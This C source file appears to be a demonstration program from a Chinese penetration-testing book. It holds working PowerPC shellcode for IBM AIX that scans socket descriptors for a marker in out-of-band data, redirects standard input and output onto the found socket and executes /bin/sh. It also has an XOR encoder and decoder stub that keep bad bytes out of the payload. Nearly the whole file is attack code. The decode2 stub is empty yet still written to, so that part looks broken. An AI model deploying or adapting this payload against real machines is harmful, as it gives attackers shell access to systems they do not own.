/* shellcode_oob.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  使用OOB数据搜索socket的shellcode
*  测试环境：IBM AIX 5.1
*/

#include <stdio.h>
#include <stdlib.h>

unsigned char sh_Buff[1024];
unsigned int  sh_Len;

unsigned char decode1[] =
"\x7d\xce\x72\x79"      //  xor.    %r14, %r14, %r14
"\x40\x82\xff\xfd"      //  bnel    .main
"\x7d\xe8\x02\xa6"      //  mflr    %r15
"\x39\xef\x01\x01"      //  addi    %r15, %r15, 0x101
"\x39\xef\xff\x37"      //  addi    %r15, %r15, -0xC9   # r15 point to start of real shellcode
"\x3a\x20\x01\x01"      //  li      %r17, 0x101
"\x38\x51\xff\xe1"      //  addi    %r2, %r17, -0x1F    # r2=0xe2 syscall number of sync. may change it
"\x3a\x31\xff\x2f"      //  addi    %r17, %r17, -0xD1   # shellcode size

"\x7e\x51\x78\xae"      //  lbzx    %r18, %r17, %r15    # read a character
"\x6a\x53\xfe\xfe"      //  xori    %r19, %r18, 0xFEFE  # xor
"\x7e\x71\x79\xae"      //  stbx    %r19, %r17, %r15    # store a character
"\x36\x31\xff\xff"      //  subic.  %r17, %r17, 1
"\x40\x80\xff\xf0"      //  bne     Loop                # loop

"\x4c\xc6\x33\x42"      //  crorc   %cr6, %cr6, %cr6
"\x7d\xe8\x03\xa6"      //  mtlr    %r15                # lr=real shellcode address
"\x44\xff\xff\x02"      //  svca    0
;

unsigned char decode2[] =
"";

void ShellCode();

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%4)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// get shellcode
void GetShellcode()
{
    unsigned char  *fnbgn_str="\x60\x60\x60\x60\x60\x60\x60\x60";
    unsigned char  *fnend_str="\x60\x60\x60\x60\x60\x60\x60\x60";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[1024];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned int   Enc_key=0x99;
    
    int l,i,j,k;

    // Deal with shellcode
    l = *((unsigned int *)ShellCode);
    pSc_addr = (unsigned char *)l;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode

    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode

    memcpy(pSc_Buff, pSc_addr, sh_Len);
    
    //PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<(sh_Len); j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<(sh_Len); j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }
    
    //printf("0x%x\n", Enc_key);
    //PrintSc(pSc_Buff, sh_Len);

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        if (sh_Len > 0xFF) {
            *(unsigned short *)&decode2[8] = sh_Len;
            *(unsigned char *)&decode2[13] = Enc_key;

            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode2)-1;
        }
        else {
            Enc_key += Enc_key << 8;

            *(unsigned char *)&decode1[31]  = sh_Len;
            *(unsigned short *)&decode1[38] = Enc_key;

            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode1)-1;
        }
    }
}

/*
int main() {
    int jump[2]={(int)sh_Buff,0};
    
    GetShellcode();
    PrintSc(sh_Buff, sh_Len);
    
    //((*(void (*)())jump)());
}
//*/

// shellcode function
void ShellCode()
{
    asm                              \
    ("                               \
        .byte   0x60,0x60,0x60,0x60, \
                0x60,0x60,0x60,0x60 ;\
                                     \
Start:                              ;\
        xor.    %r20, %r20, %r20    ;\
        bnel    Start               ;\
        mflr    %r21                ;\
        addi    %r21, %r21, 12      ;\
        b       Loop                ;\
        crorc   %cr6, %cr6, %cr6    ;\
        svca    0                   ;\
                                     \
Loop:                               ;\
        li      %r2, 0x81           ;\
        mr      %r3, %r20           ;\
        addi    %r4, %r21, -40      ;\
        li      %r5, 1              ;\
        li      %r6, 1              ;\
        mtctr   %r21                ;\
        bctrl                       ;\
                                     \
        lbz     %r4, -40(%r21)      ;\
        cmpi    %cr0, %r4, 0x49     ;\
        beq     Found               ;\
        addi    %r20, %r20, 1       ;\
        b       Loop                ;\
                                     \
Found:                              ;\
        li      %r22, 2             ;\
                                     \
DupHandle:                          ;\
        li      %r2, 0xa0           ;\
        mr      %r3, %r22           ;\
        mtctr   %r21                ;\
        bctrl                       ;\
                                     \
        li      %r2, 0x142          ;\
        mr      %r3, %r20           ;\
        li      %r4, 0              ;\
        mr      %r5, %r22           ;\
        mtctr   %r21                ;\
        bctrl                       ;\
                                     \
        addic.  %r22, %r22, -1      ;\
        bge     DupHandle           ;\
                                     \
        addi    %r3, %r21, 140      ;\
        stw     %r3, -8(%r1)        ;\
        li      %r5, 0              ;\
        stw     %r5, -4(%r1)        ;\
        subi    %r4, %r1, 8         ;\
        li      %r2, 5              ;\
        crorc   %cr6, %cr6, %cr6    ;\
        svca    0                   ;\
        .byte   '/', 'b', 'i', 'n',  \
                '/', 's', 'h', 0x0  ;\
                                     \
        .byte   0x60,0x60,0x60,0x60, \
                0x60,0x60,0x60,0x60 ;\
    ");
}
